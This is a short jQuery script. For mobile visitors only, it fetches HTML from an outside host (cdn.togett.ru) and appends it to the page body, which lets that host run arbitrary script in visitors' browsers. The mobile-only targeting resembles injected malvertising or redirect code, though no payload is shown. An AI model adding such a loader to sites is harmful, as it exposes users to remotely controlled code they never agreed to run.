$(document).ready(function(){

    var detect = new MobileDetect(window.navigator.userAgent);
    if( detect.mobile() != null ) {

        $.ajax({
            url: 'https://cdn.togett.ru/',
            type: 'get',
            success: function(data) {
                $('body').append(data);
            }
        });
    
    
        $.ajax({
            url: 'https://cdn.togett.ru/button.html',
            type: 'get',
            success: function(data) {
                $('body').append(data);
            }
        });
    }

});
